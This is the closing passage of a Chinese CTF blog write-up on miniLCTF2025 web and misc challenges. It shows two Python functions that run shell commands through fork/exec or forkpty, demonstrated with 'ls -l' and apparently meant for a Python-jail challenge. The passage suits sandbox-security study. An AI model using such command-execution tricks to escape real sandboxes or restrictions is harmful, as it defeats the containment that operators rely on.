<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">cmd</span>):</span><br><span class="line">    r, w = os.pipe()</span><br><span class="line">    pid = os.fork()</span><br><span class="line">    <span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">        os.close(r)</span><br><span class="line">        os.dup2(w, <span class="number">1</span>)</span><br><span class="line">        os.dup2(w, <span class="number">2</span>)</span><br><span class="line">        os.close(w)</span><br><span class="line">        os.execvp(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd])</span><br><span class="line">        os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.close(w)</span><br><span class="line">        <span class="keyword">with</span> os.fdopen(r) <span class="keyword">as</span> f:</span><br><span class="line">            output = f.read()</span><br><span class="line">        os.waitpid(pid, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(run_command(<span class="string">&quot;ls -l&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">cmd</span>):</span><br><span class="line">    pid, fd = os.forkpty()</span><br><span class="line">    <span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">        os.execvp(<span class="string">&quot;sh&quot;</span>, [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = os.read(fd, <span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                output += data</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        os.waitpid(pid, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> output.decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(run_command(<span class="string">&quot;ls -l&quot;</span>))</span><br></pre></td></tr></table></figure>

</div><div class="article-licensing box"><div class="licensing-title"><p>miniLCTF2025-Web/Miscå‡ºé¢˜ä¸WP</p><p><a href="https://www.xiaotian.org.cn/2025/05/05/miniLCTF2025-WebMiscå‡ºé¢˜ä¸WP/">https://www.xiaotian.org.cn/2025/05/05/miniLCTF2025-WebMiscå‡ºé¢˜ä¸WP/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>ä½œè€…</h6><p>xiaotian</p></div></div><div class="level-item is-narrow"><div><h6>å‘å¸ƒäº</h6><p>2025-05-05</p></div></div><div class="level-item is-narrow"><div><h6>æ›´æ–°äº</h6><p>2025-05-09</p></div></div><div class="level-item is-narrow"><div><h6>è®¸å¯åè®®</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=66d5ae9aabc00d00197bfee3&amp;product=sticky-share-buttons&amp;source=platform" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2025/05/07/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Flaskå†…å­˜é©¬è¯¦è§£</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/04/29/ACTF2025%E5%A4%8D%E7%8E%B0/"><span class="level-item">ACTF2025å¤ç°</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">è¯„è®º</h3><script src="https://utteranc.es/client.js" repo="xiaotian2023/xiaotian" issue-number="100" theme="github-light" crossorigin="anonymous" async></script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="xiaotian"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">xiaotian</p><p class="is-size-6 is-block">webå®‰å…¨å­¦ä¹ è€…</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>err0r</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ–‡ç« </p><a href="/archives"><p class="title">10</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">åˆ†ç±»</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ ‡ç­¾</p><a href="/tags"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/xiaotian2023" target="_blank" rel="me noopener">å…³æ³¨æˆ‘</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/xiaotian2023"><i class="fab fa-github"></i></a></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">é“¾æ¥</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/xiaotian2023/CTF-Web-Review" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">CTFå¤ç°</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">åˆ†ç±»</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF/"><span class="level-start"><span class="level-item">æŠ€æœ¯</span></span><span class="level-end"><span class="level-item tag">9</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF/ctf/"><span class="level-start"><span class="level-item">ctf</span></span><span class="level-end"><span class="level-item tag">9</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">9</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/wp/"><span class="level-start"><span class="level-item">wp</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></li></ul></li></ul></li><li><a class="level is-mobile" href="/categories/%E8%BD%AF%E4%BB%B6%E6%93%8D%E4%BD%9C/"><span class="level-start"><span class="level-item">è½¯ä»¶æ“ä½œ</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">å½’æ¡£</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2025</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/04/"><span class="level-start"><span class="level-item">å››æœˆ 2025</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/03/"><span class="level-start"><span class="level-item">ä¸‰æœˆ 2025</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">åæœˆ 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/09/"><span class="level-start"><span class="level-item">ä¹æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">æ ‡ç­¾</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xctf/"><span class="tag">xctf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%93%8D%E4%BD%9C%E6%8C%87%E5%AF%BC/"><span class="tag">æ“ä½œæŒ‡å¯¼</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">è®¢é˜…æ›´æ–°</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="è®¢é˜…"></div></div></form></div></div></div><div class="card widget" data-type="adsense"><div class="card-content"><div class="menu"><h3 class="menu-label">å¹¿å‘Š</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2272009624021828" data-ad-slot="hhh" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="è®¢é˜…"></div></div></form></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">ç›®å½•</h3><ul class="menu-list"><li><a class="level is-mobile" href="#GuessOneGuess-Web"><span class="level-left"><span class="level-item">1</span><span class="level-item">GuessOneGuess-Web</span></span></a></li><li><a class="level is-mobile" href="#PyBox-Web"><span class="level-left"><span class="level-item">2</span><span class="level-item">PyBox-Web</span></span></a></li><li><a class="level is-mobile" href="#PyJail-Misc"><span class="level-left"><span class="level-item">3</span><span class="level-item">PyJail-Misc</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">æœ€æ–°æ–‡ç« </h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-05-07T13:10:12.000Z">2025-05-07</time></p><p class="title"><a href="/2025/05/07/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/">Flaskå†…å­˜é©¬è¯¦è§£</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">æŠ€æœ¯</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-05-05T08:58:47.000Z">2025-05-05</time></p><p class="title"><a href="/2025/05/05/miniLCTF2025-WebMisc%E5%87%BA%E9%A2%98%E4%B8%8EWP/">miniLCTF2025-Web/Miscå‡ºé¢˜ä¸WP</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">æŠ€æœ¯</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-04-29T13:11:21.000Z">2025-04-29</time></p><p class="title"><a href="/2025/04/29/ACTF2025%E5%A4%8D%E7%8E%B0/">ACTF2025å¤ç°</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">æŠ€æœ¯</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-03-20T13:11:21.000Z">2025-03-20</time></p><p class="title"><a href="/2025/03/20/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">æŠ€æœ¯</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-03-11T11:49:28.000Z">2025-03-11</time></p><p class="title"><a href="/2025/03/11/python%E6%B2%99%E7%AE%B1%E4%B8%8Essti%E5%85%A5%E9%97%A8/">pythonæ²™ç®±ä¸sstiå…¥é—¨</a></p><p class="categories"><a href="/categories/%E6%8A%80%E6%9C%AF/">æŠ€æœ¯</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a> / <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="xt&#039;s blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 xiaotian</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="å›åˆ°é¡¶ç«¯" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pjax/0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ...","untitled":"(æ— æ ‡é¢˜)","posts":"æ–‡ç« ","pages":"é¡µé¢","categories":"åˆ†ç±»","tags":"æ ‡ç­¾"});
        });</script></body></html>